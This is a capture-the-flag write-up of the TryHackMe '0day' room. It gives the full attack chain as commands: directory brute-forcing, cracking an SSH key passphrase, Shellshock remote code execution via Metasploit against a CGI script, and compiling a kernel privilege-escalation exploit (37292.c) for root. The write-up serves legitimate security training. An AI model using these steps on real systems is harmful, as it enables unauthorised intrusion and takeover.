# 0day — TryHackMe Room Write-Up

**By Mohammad Meraj**  
**Date: 6-12-2025**

---

## Overview

This room involved exploiting a vulnerable CGI-based web application to achieve remote code execution via **Shellshock (CVE-2014-6271)** and escalating to root through a known Linux kernel privilege escalation vulnerability.

---

## 1. Initial Enumeration

### Nmap Scan
```

nmap -sS -sV -oN nmap/initial 10.81.164.50 -T4

```

**Open Ports:**

- 22/tcp – SSH  
- 80/tcp – HTTP  

![alt text](images/nmap(0day).png)

---

## 2. Web Directory Bruteforce

Using Gobuster to identify accessible directories:

```

gobuster dir 
-u [http://10.81.164.50](http://10.81.164.50) 
-w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt

```

**Discovered directories:**

- /cgi-bin/  
- /uploads/  
- /backup/  
- /admin/  
- /secret/  
- /img/  

![alt text](images/gobuster(0day).png)

---

## 3. Backup Directory — SSH Key Discovery

Inside `/backup`, an SSH private key (`id_rsa`) was found and downloaded.

Attempts to SSH with it failed.

![alt text](<images/ssh id_rsa.png>)

Cracking the key’s passphrase using John the Ripper:

```

python3 ssh2john.py id_rsa > key.txt
john key.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=ssh

images/john key-txt.png
```

The cracked passphrase did not lead to valid SSH access, so enumeration was continued.

---

## 4. Shellshock Discovery in /cgi-bin/

A second Gobuster scan (with common CGI extensions) revealed an interesting file:

```

gobuster dir -x php,html,cgi,sh 
-u [http://10.81.164.50/cgi-bin/](http://10.81.164.50/cgi-bin/) 
-w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt

images/gobuster2.png

```

**Found:** `test.cgi`

Testing it:

```

curl [http://10.81.164.50/cgi-bin/test.cgi](http://10.81.164.50/cgi-bin/test.cgi)

```

Output confirmed a classic CGI script (“Hello World!”).


Since CGI scripts often execute shell commands, the target was likely vulnerable to Shellshock.

![alt text](<images/searchsploit shellshock.png>)

---

## 5. Exploiting Shellshock via Metasploit

Launching Metasploit:

```

msfconsole
search shellshock

images/search exploit shellshock.png

```

The Apache CGI Shellshock module was selected. Key options configured:

```

set RHOSTS 10.81.164.50
set TARGETURI /cgi-bin/test.cgi
run

```

A Meterpreter session was obtained successfully.



---

## 6. Post-Exploitation — User Flag

Upgrading to a stable shell:

```

shell
bash -i

images/use 1.png

```

Navigating to the user’s directory:

```

cd /home/ryan
cat user.txt

```

![alt text](<images/user flag.png>)

---

## 7. Privilege Escalation

`linpeas.sh` was uploaded:

```

upload linpeas.sh
chmod +x linpeas.sh
./linpeas.sh

images/upload linpeas.png

```

LinPEAS identified the kernel version:

![alt text](<images/linpease result.png>)

```

Linux 3.13.0

```

This version is affected by known privilege escalation vulnerabilities.

A matching exploit was found using SearchSploit:

![alt text](<images/search exploit shellshock.png>)

```

searchsploit 3.13

```

Exploit used: **37292.c**


---

## 8. Root Exploit

The exploit was uploaded and compiled:

![alt text](<images/upload c file.png>)

```

upload 37292.c
gcc 37292.c -o exploit
./exploit

```

This spawned a root shell.

![alt text](<images/becoming root.png>)

Retrieving the root flag:

```

cd /root
cat root.txt

```

![alt text](<images/root flag.png>)

---

## Conclusion

The machine was vulnerable due to:

- A Shellshock-vulnerable CGI script  
- An outdated Linux kernel allowing local privilege escalation  

**Exploitation Path Summary:**

1. Directory enumeration → discover `/cgi-bin/test.cgi`  
2. Shellshock exploitation via Metasploit → RCE  
3. Enumerated kernel version → found local privilege escalation  
4. Compiled exploit → achieved full root access  

This room demonstrated classic CGI-based exploitation combined with manual privilege escalation.
